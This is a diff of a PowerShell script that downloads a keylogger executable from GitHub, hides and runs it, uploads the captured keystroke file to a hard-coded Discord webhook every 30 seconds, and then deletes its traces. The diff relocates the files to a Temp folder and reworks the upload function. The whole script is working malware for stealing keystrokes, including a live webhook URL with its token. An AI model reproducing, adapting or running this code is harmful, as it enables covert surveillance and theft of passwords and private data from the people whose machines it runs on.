@@ -1,68 +1,70 @@
-# Suppress errors and debug lines
-$ErrorActionPreference = "SilentlyContinue"
+# Define the path to the temporary folder
+$tempFolderPath = [System.IO.Path]::Combine($env:USERPROFILE, 'AppData\Local\Temp\Keylogger')
 
-# Download the executable from the GitHub URL
-$downloadPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\keylogger.exe')
-$textFilePath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\recorded_sequence.txt')
+# Create the temporary folder if it doesn't exist
+if (-not (Test-Path -Path $tempFolderPath)) {
+    New-Item -Path $tempFolderPath -ItemType Directory
+}
 
-Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger.exe' -OutFile $downloadPath
+# Define the paths for the executable and text file within the temporary folder
+$exeFilePath = [System.IO.Path]::Combine($tempFolderPath, 'keylogger.exe')
+$textFilePath = [System.IO.Path]::Combine($tempFolderPath, 'recorded_sequence.txt')
+
+# Download the executable from the GitHub URL to the temporary folder
+Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger.exe' -OutFile $exeFilePath
 
 # Check if the download was successful
-if (Test-Path $downloadPath) {
+if (Test-Path -Path $exeFilePath) {
     # Set the "Hidden" attribute to "True" to hide the file
-    Set-ItemProperty -Path $downloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+    Set-ItemProperty -Path $exeFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+
     # Execute the downloaded executable
-    Start-Process -FilePath $downloadPath -NoNewWindow
-    # Define the Discord webhook URL
-    $webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"
+    Start-Process -FilePath $exeFilePath -NoNewWindow
+} else {
+    Write-Host 'Download failed. Please check the GitHub URL and try again.'
+}
 
-    # Function to send a file to Discord using a webhook and log the response
-    function Send-FileToDiscord {
-        param (
-            [string]$WebhookUrl,
-            [string]$FilePath
-        )
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"
 
-        # Define the boundary for multipart/form-data
-        $boundary = [System.Guid]::NewGuid().ToString()
+# Function to send a file to Discord using a webhook and log the response
+function Send-FileToDiscord {
+    param (
+        [string]$WebhookUrl,
+        [string]$FilePath
+    )
 
-        # Build the multipart/form-data body
-        $body = [System.Text.StringBuilder]@{}
-        $body.AppendLine("--$boundary")
-        $body.AppendLine('Content-Disposition: form-data; name="file"; filename="' + (Get-Item $FilePath).Name + '"')
-        $body.AppendLine('Content-Type: application/octet-stream')
-        $body.AppendLine()
-        $body.AppendLine([System.IO.File]::ReadAllText($FilePath))
-        $body.AppendLine("--$boundary--")
+    # Define the boundary for multipart/form-data
+    $boundary = [System.Guid]::NewGuid().ToString()
 
-        # Convert the body to bytes
-        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body.ToString())
+    # Read the binary content of the file
+    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
 
-        # Create a web request
-        $request = [System.Net.WebRequest]::Create($WebhookUrl)
-        $request.Method = "POST"
-        $request.ContentType = "multipart/form-data; boundary=$boundary"
-        $request.ContentLength = $bodyBytes.Length
+    # Create a web request
+    $request = [System.Net.WebRequest]::Create($WebhookUrl)
+    $request.Method = "POST"
+    $request.ContentType = "multipart/form-data; boundary=$boundary"
+    $request.ContentLength = $fileBytes.Length
 
-        # Get the request stream and write the body
-        $requestStream = $request.GetRequestStream()
-        $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
-        $requestStream.Close()
+    # Get the request stream and write the file content
+    $requestStream = $request.GetRequestStream()
+    $requestStream.Write($fileBytes, 0, $fileBytes.Length)
+    $requestStream.Close()
 
-        # Get the response
-        $response = $request.GetResponse()
-        $responseStream = $response.GetResponseStream()
-        $reader = New-Object System.IO.StreamReader($responseStream)
-        $responseText = $reader.ReadToEnd()
-        $reader.Close()
-        $responseStream.Close()
-        $response.Close()
+    # Get the response
+    $response = $request.GetResponse()
+    $responseStream = $response.GetResponseStream()
+    $reader = New-Object System.IO.StreamReader($responseStream)
+    $responseText = $reader.ReadToEnd()
+    $reader.Close()
+    $responseStream.Close()
+    $response.Close()
 
-        # Log the response from Discord
-        Write-Host "Discord Webhook Response: $responseText"
-    }
+    # Log the response from Discord
+    Write-Host "Discord Webhook Response: $responseText"
+}
 
- # Send the file to Discord a maximum of 10 times
+# Send the file to Discord a maximum of 10 times
 $maxSendCount = 10     # Maximum number of times to send the file
 $sendCount = 0          # Initialize the send count
 
@@ -76,6 +78,7 @@ while ($sendCount -lt $maxSendCount) {
     # Sleep for 30 seconds
     Start-Sleep -Seconds 30
 }
+
 # After sending files to Discord 10 times, delete the text file if it still exists
 if (Test-Path -Path $textFilePath) {
     # Close the 'keylogger.exe' process if it's running
@@ -87,14 +90,10 @@ if (Test-Path -Path $textFilePath) {
     Write-Host "Text file not found at $textFilePath"
 }
 
-# Delete the 'keylogger.exe' file from the Downloads folder
-$exeFilePath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\keylogger.exe')
+# Delete the 'keylogger.exe' file from the temporary folder
 if (Test-Path -Path $exeFilePath) {
     Remove-Item -Path $exeFilePath -Force -ErrorAction SilentlyContinue
     Write-Host "Deleted $exeFilePath"
 } else {
     Write-Host "Exe file not found at $exeFilePath"
-}
-} else {
-    Write-Host 'Download failed. Please check the GitHub URL and try again.'
 }
